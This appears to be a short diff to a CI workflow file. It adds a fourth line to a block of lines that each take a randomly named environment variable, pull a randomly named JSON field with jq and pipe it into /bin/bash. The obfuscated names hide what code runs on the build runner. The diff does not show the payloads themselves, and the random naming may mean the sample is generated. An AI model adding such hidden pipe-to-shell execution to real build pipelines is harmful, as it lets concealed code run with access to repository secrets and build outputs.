@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$p91090" | jq -r .cv65 | /bin/bash
           echo $vunjt055 | jq -r .trtkc7171 | /bin/bash
           printf '%s' "$dhhi83147" | jq -r .w26 | /bin/bash
+          echo $leci61 | jq -r .t56366 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
